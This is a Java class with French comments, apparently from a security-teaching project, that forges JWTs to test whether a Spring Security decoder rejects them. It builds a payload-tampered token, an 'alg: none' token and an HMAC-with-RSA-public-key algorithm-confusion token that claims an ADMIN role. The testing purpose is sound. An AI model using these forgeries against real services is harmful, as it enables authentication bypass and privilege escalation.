package fr.portail.jeton;

import com.nimbusds.jose.JOSEObjectType;
import com.nimbusds.jose.JWSAlgorithm;
import com.nimbusds.jose.JWSHeader;
import com.nimbusds.jose.crypto.MACSigner;
import com.nimbusds.jwt.JWTClaimsSet;
import com.nimbusds.jwt.SignedJWT;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

/**
 * La forge : elle fabrique les jetons qu'un décodeur doit refuser.
 *
 * <p>⚠️ <strong>Rien ici n'est du code à reprendre.</strong> Ces méthodes
 * existent pour produire les attaques classiques contre un JWT, afin que le
 * chapitre 4 mesure ce que le vrai décodeur de Spring Security en fait. Les
 * lire est utile ; les copier, non.
 *
 * <p>Trois attaques, toutes tenues pour classiques :
 *
 * <ol>
 *   <li><strong>altérer la charge utile</strong> — on change un rôle en
 *       Base64 et on recolle la signature d'origine ;</li>
 *   <li><strong>{@code alg: none}</strong> — on prétend que le jeton n'a pas
 *       besoin de signature ;</li>
 *   <li><strong>substitution d'algorithme</strong> — on signe en HMAC avec la
 *       clé <em>publique</em> RSA comme secret. Une bibliothèque qui choisit
 *       l'algorithme d'après l'en-tête du jeton accepte alors un jeton
 *       fabriqué par n'importe qui, puisque la clé publique est publique.</li>
 * </ol>
 */
public final class Forge {

    private Forge() {
    }

    private static final Base64.Encoder SANS_REMPLISSAGE =
            Base64.getUrlEncoder().withoutPadding();

    /** Remplace un fragment de la charge utile, et garde la signature. */
    public static String chargeUtileAlteree(String jeton, String avant,
                                            String apres) {
        var morceaux = jeton.split("\\.");
        String charge = new String(Base64.getUrlDecoder().decode(morceaux[1]),
                StandardCharsets.UTF_8);
        String modifiee = charge.replace(avant, apres);
        morceaux[1] = SANS_REMPLISSAGE.encodeToString(
                modifiee.getBytes(StandardCharsets.UTF_8));
        return String.join(".", morceaux);
    }

    /** Le même jeton, présenté comme non signé : {@code alg: none}. */
    public static String sansSignature(String jeton) {
        var morceaux = jeton.split("\\.");
        String entete = "{\"alg\":\"none\",\"typ\":\"JWT\"}";
        morceaux[0] = SANS_REMPLISSAGE.encodeToString(
                entete.getBytes(StandardCharsets.UTF_8));
        // La troisieme partie est vide : c'est ce que produit `alg: none`.
        return morceaux[0] + "." + morceaux[1] + ".";
    }

    /**
     * Un jeton signé en HMAC, avec la clé publique RSA comme secret.
     *
     * <p>C'est l'attaque de substitution d'algorithme. Elle ne réussit que
     * contre une bibliothèque qui lit l'algorithme dans le jeton au lieu de
     * l'imposer.
     */
    public static String signeEnHmacAvecLaClePublique(String sujet,
            java.security.interfaces.RSAPublicKey publique) throws Exception {
        var claims = new JWTClaimsSet.Builder()
                .issuer(ServiceDeJetons.EMETTEUR)
                .subject(sujet)
                .expirationTime(java.util.Date.from(
                        java.time.Instant.now().plusSeconds(600)))
                .claim("realm_access", java.util.Map.of("roles",
                        java.util.List.of("ADMIN")))
                .build();
        var entete = new JWSHeader.Builder(JWSAlgorithm.HS256)
                .type(JOSEObjectType.JWT).build();
        var jwt = new SignedJWT(entete, claims);
        // HMAC exige au moins 256 bits de secret ; l'encodage de la cle
        // publique en fait largement plus.
        jwt.sign(new MACSigner(publique.getEncoded()));
        return jwt.serialize();
    }

    /** La charge utile, lisible — sans aucune clé. */
    public static String lireLaCharge(String jeton) {
        var morceaux = jeton.split("\\.");
        if (morceaux.length < 2) {
            return "(pas un JWT)";
        }
        return new String(Base64.getUrlDecoder().decode(morceaux[1]),
                StandardCharsets.UTF_8);
    }

    /** L'en-tête, lisible — sans aucune clé non plus. */
    public static String lireLEntete(String jeton) {
        var morceaux = jeton.split("\\.");
        return new String(Base64.getUrlDecoder().decode(morceaux[0]),
                StandardCharsets.UTF_8);
    }
}
